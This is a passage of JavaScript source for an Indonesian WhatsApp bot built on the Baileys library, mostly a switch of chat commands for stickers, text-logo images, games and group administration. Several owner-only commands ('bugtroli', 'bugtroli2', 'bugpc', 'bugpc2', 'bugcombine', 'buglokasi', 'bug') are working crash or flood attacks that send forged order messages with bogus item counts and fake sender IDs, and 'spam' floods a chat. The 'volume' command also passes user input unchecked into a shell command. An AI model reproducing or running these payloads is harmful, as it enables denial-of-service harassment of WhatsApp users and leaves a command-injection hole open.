reply(`Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
reply(`Succes mematikan autoread pribadi`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*${enter}•> gc${enter}•> pc`)
}
break
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await alpha.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
alpha.relayWAMessage(costick)
break
case 'spam':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (!m.quoted) return reply(`reply pesanya`)
if (args.length < 1) return reply(`Example :${enter}${prefix}spam 15`)
if (args[0] > 100) return reply(`Maximal 100`)
let jml = args[0]
for(let i=0;i<jml;i++){
m.quoted.copyNForward(m.chat, true)
}
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (isQuotedSticker) {
if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
reply("Done Bwang")
} else {
reply('tag stickenya')
}
break
case 'delcmd':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (!isQuotedSticker) return reply(`Usage : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Done Bwang")
break
case 'listcmd':
let teksnyee = `${petik}「 LIST STICKER CMD 」${petik}`
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `${enter}${enter}*•> ID :* ${i.id}${enter}*•> Cmd :* ${i.chats}`
}
reply(teksnyee)
break
case 'stopbot':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
stopjadibot(alpha, from, sender, mek)
break
case 'jadibot':
if (!isOwner) return reply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
jadibot(alpha, from, sender, reply, mek)
break
case 'antitag':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply(`Ketik on untuk mengaktifkan${enter}Ketik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (antitags === true) return
antitags = true
reply(`Berhasil mengaktifkan antitag!`)
} else if (args[0] === 'off') {
if (antitags === false) return
antitags = false
reply(`Berhasil menonaktifkan antitag!`)
} else {
reply('Pilih on atau off')
}
break
case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
alpha.sendMessage(from, `${creator} ${vipi}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${creator} ${vipi}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'bugtroli':
              if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
alpha.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: fs.readFileSync(`./image/${thumbnail}`),
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
alpha.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${creator} ${vipi}`
		        var grousp = await alpha.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        alpha.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62887435047326@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${vipi}`,
						"orderTitle": `${creator} ${vipi}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        alpha.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62887435047326@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator} ${vipi}`,
						"orderTitle": `${creator} ${vipi}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
                 alpha.toggleDisappearingMessages(from, '👾👾👾')
alpha.sendMessage(from, `${creator}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${creator} ${vipi}`,
    orderTitle: `${creator} ${vipi}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    alpha.updatePresence(from, Presence.composing)
	    reply(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
alpha.updatePresence(from, Presence.composing)
		       alpha.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${creator}`,
						address: `${creator} ${vipi}`,
                        jpegThumbnail: fs.readFileSync(`./image/${thumbnail}`) },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${creator} ${vipi}`,
    orderTitle: `${creator} ${vipi}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
alpha.updatePresence(from, Presence.composing)
alpha.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${creator}`,
    orderTitle: `${creator} ${vipi}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
					case 'bug':
					if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await alpha.toggleDisappearingMessages(from, 0)
}
reply('Sukses send bug sebanyak '+args.join(' '))
					break
case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await alpha.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
alpha.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, duration: 9292929374820, quoted: ftroli})
fs.unlinkSync(rname)
})
break
case 'fliptext':
if (args.length < 1) return reply(`Example:${enter}${prefix}fliptext ZEEONEOFC`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(` F L I P   T E X T ${enter}*•> Normal :*${enter}${quere}${enter}*•> Flip :*${enter}${flipe}`)
break
case 'setlink':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
if (args[0] === "com") {
linknye = `${linkcom}`
reply('Succes change antilink com')
} else if (args[0] === "id") {
linknye = `${linkid}`
reply('Succes change antilink id')
} else if (args[0] === "xyz") {
linknye = `${linkxyz}`
reply('Succes change antilink xyz')
} else if (args[0] === "http") {
linknye = `${linkhttp}`
reply('Succes change antilink http')
} else if (args[0] === "ly") {
linknye = `${linkly}`
reply('Succes change antilink ly')
} else if (args[0] === "wa") {
linknye = `${linkwa}`
reply('Succes change antilink wa')
}else if (args[0] === "wame") {
linknye = `${linkwame}`
reply('Succes change antilink wa.me')
} else if (args[0] === "default") {
linknye = `${deflt}`
reply('Succes change antilink default')
} else {
reply(`*List Anti Link*${enter}•> com${enter}•> id${enter}•> xyz${enter}•> ly${enter}•> http${enter}•> wa${enter}•> wame${enter}•> default`)
}
break
case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply('✓ANTILINK DI AKTIFKAN')
} else if (args[0] === "0") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply('✓ANTILINK DI MATIKAN')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'blocklist':
let blockede = alpha.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != alpha.user.jid)
alpha.reply(m.chat, `┌「 *LIST BLOCK* 」` + `${enter}` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`${enter}` + `${enter}└────`, m, { contextInfo: { mentionedJid: blocked } })
break
case 'detikvn':
if (!isQuotedAudio) return reply('Reply audionya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await alpha.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
alpha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(media)
break
case 'detikvideo':
if (!isQuotedVideo) return reply('Reply videonya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await alpha.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
alpha.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(media)
break
case 'sider':
try {
if (!isGroup) return reply('Hanya bisa didalam gruop')
if (!isQuotedReply) return reply('Reply pesan botnya')      
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
hemms = infom.deliveries
readon = hemms.map(v => v.jid)
readdin = hemm.map(v => v.jid)
stamp = hemm.map(v => v.t)
      
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 	
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();
var time = `${hour}:${min}:${sec}` ;
return time;
}

function toBulan(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];
var myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];  
var day = a.getDate()
bulanee = a.getMonth()
var thisDay = a.getDay(),
thisDay = myDays[thisDay];
var yy = a.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}` ;
return bul;
}
teksx = `「 *READ* 」${enter}${enter}`
for (let i of hemm) {
teksx += `•> Nama : @${i.jid.split('@')[0]}${enter}•> Waktu : ${toTime(i.t, true)}${enter}•> Tanggal : ${toBulan(i.t, true)}${enter}${enter}`
}
teksx1 = `「 *DELIVERIES* 」${enter}${enter}`
for (let i of hemms){
teksx1 += `•> Nama : @${i.jid.split('@')[0]}${enter}`
teksx1 += `•> Waktu : ${toTime(i.t, true)}${enter}•> Tanggal : ${toBulan(i.t, true)}${enter}${enter}`
}
alpha.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: mek, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
alpha.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: mek, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
} catch(e) {
reply('reply pesan bot')
reply(e)
console.log(e)
}
break
case 'tahta':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'neon2':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break                    
       case 'wall':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break   
       case 'wolf':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break 
       case 'tfire':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break                
       case 'ytgold':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'ytsilver':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 't3d':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'logoa':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'pornhub':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'marvel':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'leavest':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break                    
       case 'phcoment':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
       case 'nulis':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
                   alpha.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`, quoted: mek})
                   break
        case 'ttp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${hhh}`)
                    alpha.sendMessage(from, anu1, image, {quoted: ftroli, caption : '.sticker'})
                    break
         case 'attp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    alpha.sendMessage(from, anu1, sticker, {quoted: mek})
                    break
           case 'kickreply': case 'rkick':
		    if (!isGroup) return reply('only grup')
		if (!isGroupAdmins) return reply('only admin grup')
					if (!isBotGroupAdmins) return reply('bot bukan admin')
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			kicknya = mek.message.extendedTextMessage.contextInfo.participant
		    await alpha.groupRemove(from, [kicknya])
		    reply('Sayonara')
			break
			case 'addreply': case 'radd':
			if (!isGroup) return reply('only grup')
			if (!isGroupAdmins) return reply('only admin grup')
					if (!isBotGroupAdmins) return reply('bot bukan admin')
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			addnya = mek.message.extendedTextMessage.contextInfo.participant
		    await alpha.groupAdd(from, [addnya])
		    reply('Welcome')
			break
         
case 'phy':
case 'photoxy':
if (args.length < 1) return reply(`Example :${enter}${prefix}photoxy <name>`)
if (args[0] === 'glitch') {
if (args.length < 2) return reply(`Example :${enter}${prefix}photoxy glitch ZEEONE|OFC`)
var cv = body.slice(12)
var quer = cv.split("|")[0];
var quer1 = cv.split("|")[1];
reply(mess.wait)
ph.pGlitch(quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, '```[ ✓ ]``` Done')
})
} else if (args[0] === 'coffecup') {
if (args.length < 2) return reply(`Example :${enter}${prefix}photoxy coffecup ZEEONE`)
anu = body.slice(14)
reply(mess.wait)
ph.pCoffeCup(anu).then(res => {
sendMediaURL(from, `${res.url}`, '```[ ✓ ]``` Done')
})
} else if (args[0] === 'shadow') {
if (args.length < 2) return reply(`Example :${enter}${prefix}photoxy shadow ZEEONE`)
anu = body.slice(12)
reply(mess.wait)
ph.pShadow(anu).then(res => {
sendMediaURL(from, `${res.url}`, '```[ ✓ ]``` Done')
})
} else if (args[0] === 'neon') {
if (args.length < 2) return reply(`Example :${enter}${prefix}photoxy neon ZEEONE`)
anu = body.slice(9)
reply(mess.wait)
ph.pNeons(anu).then(res => {
sendMediaURL(from, `${res.url}`, '```[ ✓ ]``` Done')
})
} else if (args[0] === 'wanted') {
if (args.length < 2) return reply(`Example :${enter}${prefix}photoxy wanted https://telegra.ph/file/0f22f06d7e58432fec797.jpg|ZEEONE|OFC`)
var cv = body.slice(12)
var uri = cv.split("|")[0];
var quer = cv.split("|")[1];
var quer1 = cv.split("|")[2];
reply(mess.wait)
ph.pWanted(uri, quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, '```[ ✓ ]``` Done')
})
} else {
reply(`*List Photooxy :*${enter}•> glitch${enter}•> coffecup${enter}•> shadow${enter}•> wanted${enter}•> neon`)
}
break
case 'virus4':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
tapib1 = fs.readFileSync('./media/audio/araara.mp3')
alpha.sendMessage(from, tapib1, document, { quoted: mek, filename:`${creator} ${vipi}.mp3`, mimetype: 'audio/application' })
break
case 'getp':
try {
pic = await alpha.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
alpha.sendMessage(from, thumb, MessageType.image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: "Nih kak..."})
break
case 'getpic':
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.participant
try {
pic = await alpha.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
alpha.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else if (args[0]) {
try {
pic = await alpha.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
alpha.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else {
reply(`Example :${enter}${prefix}${command} 62xxx${enter}${prefix}${command} <reply>`)
}
break
case 'getbio':
var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await alpha.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found")
}
break
case 'getname':
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = alpha.contacts[ambl] != undefined ? alpha.contacts[ambl].sname || alpha.contacts[ambl].notify : undefined
reply(sname)
break
case 'restart':
if (!mek.key.fromMe && !isOwner) return
reply('Restart...')
await exec(`node main`, (err, stdout) => {
if (err) return alpha.sendMessage(from, `${err}`, text, { quoted: mek })
if (stdout) {
console.log('Restart...')
}
})
console.log(stdout)
break
case 'playstore':
if (args.length < 1) return reply(`Example :${enter}${prefix}playstore whatsapp`)
quer = args.join(" ")
hx.playstore(quer).then(res => {
teks = '```「 Play Store 」```'
for (let i of res) {
teks += `${enter}${enter}${i.name}${enter}`
teks += `${i.link}${enter}`
teks += `${i.developer}`
}
reply(teks)
})
break
case 'searchgc':
if (args.length < 1) return reply(`Example :${enter}${prefix}searchgc bot`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `${enter}${enter}•> Group Whatsapp :${enter}`
teks += `${i.link}${enter}`
teks += `${i.nama}`
}
reply(teks)
})
break
case 'cekhistory':
reply(` S T A T U S  T I C T A C T O E ${enter}•> Win : ${checkWin(sender)}${enter}•> Lose : ${checkLose(sender)}`)
break
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply('Berhasil Menghapus Sesi Ttt')
}
} else if (args[0] === 'vote') {
if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
} else {
	reply(`${prefix + command}delsesi ttt atau vote`)
}
break

case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*Khusus group*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
